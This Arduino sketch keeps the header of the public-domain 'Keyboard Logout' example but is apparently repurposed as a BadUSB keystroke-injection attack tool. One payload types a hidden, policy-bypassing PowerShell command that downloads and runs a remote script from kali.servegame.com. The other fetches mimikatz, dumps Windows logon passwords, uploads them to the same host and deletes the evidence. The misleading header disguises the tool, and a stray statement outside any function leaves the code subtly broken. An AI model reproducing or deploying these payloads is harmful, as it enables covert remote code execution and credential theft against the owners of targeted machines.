/*
  Keyboard logout

  This sketch demonstrates the Keyboard library.

  When you connect pin 2 to ground, it performs a logout.
  It uses keyboard combinations to do this, as follows:

  On Windows, CTRL-ALT-DEL followed by ALT-l
  On Ubuntu, CTRL-ALT-DEL, and ENTER
  On OSX, CMD-SHIFT-q

  To wake: Spacebar.

  Circuit:
  - Arduino Leonardo or Micro
  - wire to connect D2 to ground

  created 6 Mar 2012
  modified 27 Mar 2012
  by Tom Igoe

  This example is in the public domain.

  https://www.arduino.cc/en/Tutorial/BuiltInExamples/KeyboardLogout
*/

#define OSX 0
#define WINDOWS 1
#define UBUNTU 2

#include "Keyboard.h"

// change this to match your platform:
int platform = OSX;

void setup() {
  // make pin 2 an input and turn on the pull-up resistor so it goes high unless
  // connected to ground:
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
  
}
//
//
//=====
//======================
//
//?????
//=???????????????
//
int i = 0 ; 

#define nothing 0
#define reverse_shell 1
#define password_stealer 2

#define test 3

int payload = test;

delay(3000)

void loop() {
//  while (digitalRead(2) == HIGH) {
//    // do nothing until pin 2 goes low
//    delay(500);
//  }
    delay(1000);
    while (i < 1) {
      switch (payload){
        case nothing:
          i++;
          break;
        case reverse_shell: //Done
          delay(1000);
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press('r');
          Keyboard.releaseAll();
          delay(500);
          Keyboard.print("powershell.exe -executionpolicy bypass -w hidden 'iex(New-Object System.Net.WebClient).DownloadString('http://kali.servegame.com:8000/powershell.ps1'); powershell.ps1'");
          delay(600);
          Keyboard.press(KEY_LEFT_CTRL);
          Keyboard.press(KEY_RIGHT_SHIFT);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.press(KEY_LEFT_ARROW);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
          i++;
          break;
        
  
        
        case password_stealer: //Done
          delay(1000);
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press('r');
          Keyboard.releaseAll();
          delay(500);
          Keyboard.print("powershell");
          delay(600);
          Keyboard.press(KEY_LEFT_CTRL);
          Keyboard.press(KEY_RIGHT_SHIFT);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.press(KEY_LEFT_ARROW);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.println("$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://kali.servegame.com:8000/mimikatz64.exe','C:/mim64.exe'); $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://kali.servegame.com:8000/mimikatz32.exe','C:/mim32.exe');C:/mim64.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' > C:/64.txt ; C:/mim32.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' > C:/32.txt ; iwr kali.servegame.com:8000/up.php -method POST -infile C:/64.txt ; start-sleep -s 1; iwr kali.servegame.com:8000/up.php -method POST -infile C:/32.txt;rm C:/mim64.exe; rm C:/mim32.exe; rm C:/64.txt; rm C:/32.txt; exit");

          i++;
          break;


        case test:

          i++;
          break;
      }        
    }

//
//  switch (platform) {
//    case OSX:
//      Keyboard.press(KEY_LEFT_GUI);
//      // Shift-Q logs out:
//      Keyboard.press(KEY_LEFT_SHIFT);
//      Keyboard.press('Q');
//      delay(100);
//      Keyboard.releaseAll();
//      // enter:
//      Keyboard.write(KEY_RETURN);
//      break;
//    case WINDOWS:
//      // CTRL-ALT-DEL:
//      Keyboard.press(KEY_LEFT_CTRL);
//      Keyboard.press(KEY_LEFT_ALT);
//      Keyboard.press(KEY_DELETE);
//      delay(100);
//      Keyboard.releaseAll();
//      // ALT-l:
//      delay(2000);
//      Keyboard.press(KEY_LEFT_ALT);
//      Keyboard.press('l');
//      Keyboard.releaseAll();
//      break;
//    case UBUNTU:
//      // CTRL-ALT-DEL:
//      Keyboard.press(KEY_LEFT_CTRL);
//      Keyboard.press(KEY_LEFT_ALT);
//      Keyboard.press(KEY_DELETE);
//      delay(1000);
//      Keyboard.releaseAll();
//      // Enter to confirm logout:
//      Keyboard.write(KEY_RETURN);
//      break;
//  }
  // do nothing:
//  while (true);
}
